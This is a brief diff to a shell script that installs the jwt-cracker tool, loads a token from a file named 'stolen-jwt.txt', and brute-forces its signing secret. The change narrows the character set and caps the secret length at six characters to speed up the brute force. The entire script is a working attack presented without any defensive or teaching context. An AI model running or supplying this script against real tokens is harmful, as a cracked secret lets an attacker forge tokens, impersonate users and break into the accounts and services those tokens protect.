@@ -1,4 +1,6 @@
 #!/bin/sh
 npm i -g jwt-cracker
 token=`cat stolen-jwt.txt`
-jwt-cracker $token 
+#alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+alphabet="abcdefghijklmnopqrstuvwxyz0123456789"
+jwt-cracker $token $alphabet 6
